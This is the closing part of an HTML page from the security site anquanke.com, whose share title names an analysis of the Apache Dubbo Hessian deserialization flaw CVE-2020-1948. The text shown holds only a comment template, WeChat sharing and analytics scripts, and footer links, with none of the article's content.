                        <span class="commentlist-like">
                            <span id="comment-like-button-{{id}}" onclick="like({{id}});"
                                  class="commentlist-like-count {{#if liked}}liked{{/if}}">
                                <i class="fa fa-thumbs-o-up" aria-hidden="true"></i>
                                <span id="comment-like-count-{{id}}">{{#if_not_eq like_count 0}}{{like_count}} {{/if_not_eq}}</span>
                        </span>
                        </span>
                        <a class="submit reply-comment"
                           onclick="replyBox({{id}},'{{#if user}}{{user.nickname}}{{else}}{{nickname}}{{/if}}');">回复</a>
                    </div>
                </div>
                <p>
                    <span class="text">{{content}}</span>
                <div class="reply-box" id="reply-box-{{id}}"></div>
                </p>
            </div>
            {{#if_eq parent undefine}}
            <ul id="comment-child-{{id}}" class="comment-child"
                style="{{#if comments}}display:block;{{else}}display:none; {{/if}}">
                {{subcomments comments}}
            </ul>
            {{/if_eq}}
        </li>
        {{#if comments}} {{#if parent}}
        <ul id="comment-child-{{id}}" style="padding:0px;">
            {{subcomments comments}}
        </ul>
        {{/if}} {{/if}}
    </script>

<script>
    wx.config({
        debug: false,
        appId: 'wx9ba4ea8f6c451937',
        timestamp: '1593665643',
        nonceStr: 'YN3ySwz0fLmbozvQ',
        signature: '3e67fed3f2f6f38d26e540d58dbf488ec221bd94',
        jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage"]
    });
    wx.ready(function () {
        wx.onMenuShareTimeline({
            title: 'CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析', // 分享标题
            link: window.location.href,
            imgUrl: 'https://p3.ssl.qhimg.com/sdm/100_100_100/t0164d67734a841c580.jpg',
            success: function () {

            },
            cancel: function () {
                // 用户取消分享后执行的回调函数
            }
        });
        var desc = "https://p3.ssl.qhimg.com/t0164d67734a841c580.jpg";
        wx.onMenuShareAppMessage({
            title: 'CVE-2020-1948 Apache Dubbo Hessian 反序列化漏洞分析',
            desc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
            link: window.location.href,
            imgUrl: 'https://p3.ssl.qhimg.com/sdm/100_100_100/t0164d67734a841c580.jpg',
            type: 'link',
            dataUrl: '',
            success: function () {

            },
            cancel: function () {

            }
        });
    });

    hs.graphicsDir = 'https://static.anquanke.com/highslide/';
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    $('.article-content img').wrap(function () {
        if (!$(this).parent().attr('href')) {
            var imgurl = $(this).attr('data-original');
            return '<a href="' + imgurl + '" class="highslide-img" onclick="return hs.expand(this);" target="_blank"></a>';
        }
    })

</script>
<footer>
    <div class="footer">
        <div class="container">
            <div class="hide-in-mobile-device">
                <div class="row">
                    <div class="item col col-6">
                        <div class="logo">
                            <img alt="安全客Logo" class="pic" src="https://p0.ssl.qhimg.com/t0168809c9f19b4fec6.png"
                                 style="height:54px;">
                        </div>
                        <div style="margin-top: 20px;">
                            <div class="row">
                                <div class="col col-5">
                                    <a href="https://zhuanlan.zhihu.com/c_118578260" target="_blank"
                                       rel="noopener noreferrer">
                                        <div class="social zhihu">
                                            <img src="https://p0.ssl.qhimg.com/t014afa383e7a786b4a.png" alt="安全客"
                                                 style="width: 20px; height: 20px;">
                                        </div>
                                    </a>
                                </div>

                                <div class="col col-5">
                                    <a href="https://weibo.com/360adlab" target="_blank"
                                       rel="nofollow noopener noreferrer" style="color: white">
                                        <div class="social weibo">
                                            <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em"
                                                 width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
                                                <g>
                                                    <path d="m15.1 28.7q0.4-0.8 0.2-1.6t-1-1.1q-0.8-0.3-1.6 0t-1.4 1q-0.5 0.8-0.3 1.5t1 1.2 1.7 0 1.4-1z m2.1-2.7q0.1-0.3 0-0.6t-0.3-0.4q-0.4-0.2-0.7 0t-0.5 0.4q-0.3 0.7 0.3 1 0.3 0.1 0.7 0t0.5-0.4z m3.8 2.3q-1 2.3-3.5 3.4t-5 0.3q-2.4-0.8-3.3-2.9t0.2-4.1q1-2.1 3.4-3.1t4.7-0.5q2.4 0.7 3.5 2.7t0 4.2z m7-3.5q-0.2-2.2-2-3.8t-4.6-2.5-6.2-0.4q-4.9 0.5-8.2 3.1t-3 5.9q0.2 2.2 2 3.8t4.7 2.5 6.1 0.4q5-0.5 8.3-3.1t2.9-5.9z m6.9 0.1q0 1.5-0.8 3.1t-2.5 3-3.7 2.7-5.1 1.8-6 0.7-6.2-0.7-5.3-2.1-3.9-3.4-1.4-4.4q0-2.6 1.6-5.5t4.4-5.8q3.7-3.7 7.6-5.2t5.5 0.1q1.4 1.4 0.4 4.7-0.1 0.3 0 0.4t0.2 0.2 0.4 0 0.3-0.1l0.1-0.1q3.1-1.3 5.5-1.3t3.4 1.4q1 1.4 0 4 0 0.3-0.1 0.4t0.1 0.3 0.3 0.2 0.3 0.1q1.3 0.4 2.3 1t1.8 1.9 0.8 2.6z m-1.7-14q1 1.1 1.3 2.5t-0.2 2.6q-0.2 0.5-0.7 0.7t-0.9 0.1q-0.6-0.1-0.8-0.6t-0.1-1q0.5-1.4-0.5-2.5t-2.4-0.8q-0.6 0.1-1-0.2t-0.6-0.8q-0.1-0.5 0.2-1t0.8-0.5q1.4-0.3 2.7 0.1t2.2 1.4z m4.1-3.6q1.9 2.1 2.5 5t-0.3 5.4q-0.2 0.6-0.8 0.8t-1.1 0.1-0.9-0.7-0.1-1.2q0.6-1.8 0.2-3.8t-1.8-3.5q-1.4-1.6-3.3-2.2t-3.9-0.2q-0.6 0.2-1.1-0.2t-0.7-1 0.2-1.1 1-0.7q2.7-0.5 5.4 0.3t4.7 3z"></path>
                                                </g>
                                            </svg>
                                        </div>
                                    </a>
                                </div>
                                <!-- Modal -->

                                <div class="col col-5">
                                    <div class="social weixin" data-toggle="modal" data-target="#wechat-qrcode">
                                        <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em"
                                             width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
                                            <g>
                                                <path d="m11.3 11.6q0-0.8-0.5-1.3t-1.3-0.5q-0.8 0-1.5 0.5t-0.6 1.3q0 0.7 0.6 1.2t1.5 0.5q0.8 0 1.3-0.5t0.5-1.2z m14.4 9.8q0-0.5-0.5-1t-1.3-0.4q-0.5 0-0.9 0.4t-0.5 1q0 0.5 0.5 1t0.9 0.4q0.8 0 1.3-0.4t0.5-1z m-4.6-9.8q0-0.8-0.5-1.3t-1.2-0.5q-0.9 0-1.5 0.5t-0.7 1.3q0 0.7 0.7 1.2t1.5 0.5q0.7 0 1.2-0.5t0.5-1.2z m12.3 9.8q0-0.5-0.5-1t-1.2-0.4q-0.6 0-1 0.4t-0.4 1q0 0.5 0.4 1t1 0.4q0.7 0 1.2-0.4t0.5-1z m-5.1-7.7q-0.6-0.1-1.4-0.1-3.3 0-6 1.5t-4.4 4.1-1.6 5.5q0 1.5 0.5 3-0.7 0-1.3 0-0.5 0-1 0t-1.1-0.1-0.8-0.1-1.1-0.2-1-0.3l-4.9 2.5 1.4-4.2q-5.6-4-5.6-9.5 0-3.3 1.9-6.1t5.1-4.3 7.1-1.6q3.4 0 6.4 1.3t5.1 3.5 2.7 5.1z m11.5 10.9q0 2.3-1.4 4.3t-3.6 3.8l1.1 3.5-3.9-2.1q-2.9 0.7-4.2 0.7-3.3 0-6-1.4t-4.4-3.7-1.6-5.1 1.6-5.1 4.4-3.8 6-1.3q3.1 0 5.9 1.3t4.4 3.8 1.6 5.1z"></path>
                                            </g>
                                        </svg>
                                    </div>
                                    <div class="modal fade " id="wechat-qrcode" tabindex="-1" role="dialog"
                                         aria-hidden="true">
                                        <div class="modal-dialog  modal-sm" role="document" style="width: 265px;">
                                            <div class="modal-content"
                                                 style="width: 265px !important;padding: 0px !important;">
                                                <div class="modal-header">
                                                    <h5 class="modal-title" id="exampleModalLabel">微信二维码</h5>
                                                    <button type="button" class="close" data-dismiss="modal"
                                                            aria-label="Close">
                                                        <span aria-hidden="true">&times;</span>
                                                    </button>
                                                </div>
                                                <div class="modal-body" style="padding: 0px !important;">
                                                    <img src="https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg"
                                                         alt="安全客" style="width: 265x; height: 265px;">
                                                </div>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="item col col-5">
                        <h2>安全客</h2>
                        <ul>
                            <li>
                                <a href="/about" rel="noopener noreferrer" target="_blank">关于我们</a>
                            </li>
                            <li>
                                <a href="/join" target="_blank" rel="noopener noreferrer">加入我们</a>
                            </li>
                            <li>
                                <a href="/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a>
                            </li>
                            <li>
                                <a href="/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a>
                            </li>
                        </ul>
                    </div>
                    <div class="item col col-5">
                        <h2>商务合作</h2>
                        <ul>
                            <li>
                                <a href="/note/business" target="_blank" rel="noopener noreferrer">合作内容</a>
                            </li>
                            <li>
                                <a href="/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a>
                            </li>
                            <li>
                                <a href="/link" target="_blank" rel="noopener noreferrer">友情链接</a>
                            </li>
                        </ul>
                    </div>
                    <div class="item col col-5">
                        <h2>内容须知</h2>
                        <ul>
                            <li>
                                <a href="https://www.anquanke.com/contribute/tips" target="_blank"
                                   rel="noopener noreferrer">投稿须知</a>
                            </li>
                            <li>
                                <a href="/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a>
                            </li>
                            <li>
                                官网QQ群3：830462644
                            </li>
                            <li>
                                官网QQ群2：814450983(已满)
                            </li>
                            <li>
                                官网QQ群1：702511263(已满)
                            </li>


                        </ul>
                    </div>
                    <div class="item col col-3">
                        <h2>合作单位</h2>
                        <ul>
                            <li>
                                <a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer">
                                    <img alt="安全客" src="https://p0.ssl.qhimg.com/t01592a959354157bc0.png"
                                         style="max-height: 40px;">
                                </a>
                            </li>
                            <li>
                                <a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer">
                                    <img alt="安全客" src="https://p0.ssl.qhimg.com/t014f76fcea94035e47.png"
                                         style="max-height: 50px;margin-top:10px;">
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="bottom-info">Copyright © 360网络攻防实验室 All Rights Reserved 京ICP备08010314号-66
                <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
                    document.write(unescape("%3Cspan id='cnzz_stat_icon_1271278035'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1271278035%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
                <script>
                    (function () {
                        var bp = document.createElement('script');
                        var curProtocol = window.location.protocol.split(':')[0];
                        if (curProtocol === 'https') {
                            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                        }
                        else {
                            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                        }
                        var s = document.getElementsByTagName("script")[0];
                        s.parentNode.insertBefore(bp, s);
                    })();
                </script>
            </div>
        </div>
    </div>

    <div class="back-to-top" onclick='$("html,body").animate({scrollTop:0}, 500);'
         style="position: fixed;bottom:40px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
        <img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
    </div>
    <div id="dynamicScript">
    </div>

</footer></body>

</html>